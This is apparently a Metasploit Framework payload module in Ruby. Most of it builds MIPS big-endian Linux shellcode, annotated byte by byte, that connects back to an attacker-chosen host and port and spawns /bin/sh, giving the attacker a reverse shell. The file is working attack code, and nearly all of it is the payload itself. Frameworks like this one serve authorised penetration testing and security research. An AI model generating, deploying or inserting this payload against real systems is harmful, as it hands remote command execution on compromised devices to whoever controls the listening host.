##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

# Written in a hurry using shellforge and my MIPS shellforge loader (avail. on cr0.org)

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Linux
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Reverse TCP Inline',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'Julien Tinnes',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_MIPSBE,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShellUnix,
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				})
		)
	end

	def generate
		if( !datastore['LHOST'] or datastore['LHOST'].empty? )
			return super
		end

		host = Rex::Socket.addr_atoi(datastore['LHOST'])
		port = Integer(datastore['LPORT'])

		host = [host].pack("N").unpack("cccc")
		port = [port].pack("n").unpack("cc")

		shellcode =
			"\x24\x09\xff\xef" +                    # li	t1,-17
			"\x05\x10\xff\xff" +                    # bltzal	t0,0x4
			"\x28\x08\x82\x82" +                    # slti	t0,zero,-32126
			"\x01\x20\x48\x27" +                    # nor	t1,t1,zero
			"\x01\x3f\xc8\x21" +                    # addu	t9,t1,ra
			"\xaf\xb9\x85\x48" +                    # sw	t9,-31416(sp)
			"\x23\xb9\x85\x48" +                    # addi	t9,sp,-31416
			"\x3c\x1c\x00\x00" +                    # lui	gp,0x0
			"\x27\x9c\x00\x00" +                    # addiu	gp,gp,0
			"\x03\x99\xe0\x21" +                    # addu	gp,gp,t9
			"\x27\xbd\xff\xd0" +                    # addiu	sp,sp,-48
			"\xaf\xbc\x00\x00" +                    # sw	gp,0(sp)
			"\xaf\xbc\x00\x28" +                    # sw	gp,40(sp)
			"\x8f\x84\x00\x00" +                    # lw	a0,0(gp)
			"\x00\x00\x00\x00" +                    # nop
			"\x24\x84\x00\xf8" +                    # addiu	a0,a0,248
			"\x00\x00\x00\x00" +                    # nop
			"\x8c\x85\x00\x00" +                    # lw	a1,0(a0)
			"\x8c\x87\x00\x04" +                    # lw	a3,4(a0)
			"\x3c\x08" + host[0..1].pack("C2") +    # lui	t0,0xc0a8
			"\x35\x06" + host[2..3].pack("C2") +    # ori	a2,t0,0x109
			"\x27\xb9\x00\x18" +                    # addiu	t9,sp,24
			"\x24\x03\x00\x02" +                    # li	v1,2
			"\x24\x02" + port.pack("C2") +          # li	v0,4646
			"\xaf\xa5\x00\x18" +                    # sw	a1,24(sp)
			"\xaf\xa6\x00\x0c" +                    # sw	a2,12(sp)
			"\xaf\xa7\x00\x1c" +                    # sw	a3,28(sp)
			"\xa7\xa3\x00\x08" +                    # sh	v1,8(sp)
			"\xa7\xa2\x00\x0a" +                    # sh	v0,10(sp)
			"\xaf\xb9\x00\x20" +                    # sw	t9,32(sp)
			"\xaf\xa0\x00\x24" +                    # sw	zero,36(sp)
			"\x24\x04\x00\x02" +                    # li	a0,2
			"\x24\x05\x00\x02" +                    # li	a1,2
			"\x00\x00\x30\x21" +                    # move	a2,zero
			"\x24\x02\x10\x57" +                    # li	v0,4183
			"\x00\x00\x00\x0c" +                    # syscall
			"\x24\x04\xff\xff" +                    # li	a0,-1
			"\x10\x44\x00\x1a" +                    # beq	v0,a0,0x100
			"\x00\x40\x18\x21" +                    # move	v1,v0
			"\x00\x60\x20\x21" +                    # move	a0,v1
			"\x24\x06\x00\x10" +                    # li	a2,16
			"\x27\xa5\x00\x08" +                    # addiu	a1,sp,8
			"\x24\x02\x10\x4a" +                    # li	v0,4170
			"\x00\x00\x00\x0c" +                    # syscall
			"\x14\x40\x00\x0e" +                    # bnez	v0,0xec
			"\x00\x00\x28\x21" +                    # move	a1,zero
			"\x24\x02\x0f\xdf" +                    # li	v0,4063
			"\x00\x00\x00\x0c" +                    # syscall
			"\x24\x05\x00\x01" +                    # li	a1,1
			"\x24\x02\x0f\xdf" +                    # li	v0,4063
			"\x00\x00\x00\x0c" +                    # syscall
			"\x24\x05\x00\x02" +                    # li	a1,2
			"\x24\x02\x0f\xdf" +                    # li	v0,4063
			"\x00\x00\x00\x0c" +                    # syscall
			"\x03\x20\x20\x21" +                    # move	a0,t9
			"\x27\xa5\x00\x20" +                    # addiu	a1,sp,32
			"\x00\x00\x30\x21" +                    # move	a2,zero
			"\x24\x02\x0f\xab" +                    # li	v0,4011
			"\x00\x00\x00\x0c" +                    # syscall
			"\x00\x00\x20\x21" +                    # move	a0,zero
			"\x24\x02\x0f\xa1" +                    # li	v0,4001
			"\x00\x00\x00\x0c" +                    # syscall
			"\x03\xe0\x00\x08" +                    # jr	ra
			"\x27\xbd\x00\x30" +                    # addiu	sp,sp,48
			"\x24\x04\x00\x01" +                    # li	a0,1
			"\x24\x02\x0f\xa1" +                    # li	v0,4001
			"\x00\x00\x00\x0c" +                    # syscall
			"\x10\x00\xff\xe4" +                    # b	0xa0
			"\x00\x60\x20\x21" +                    # move	a0,v1
			"\x2f\x62\x69\x6e" +                    # "/bin"
			"\x2f\x73\x68\x00" +                    # "/sh\x00"
			"0"*80
			# FIXME: remove extra 0 bytes!

		return super + shellcode
	end

end
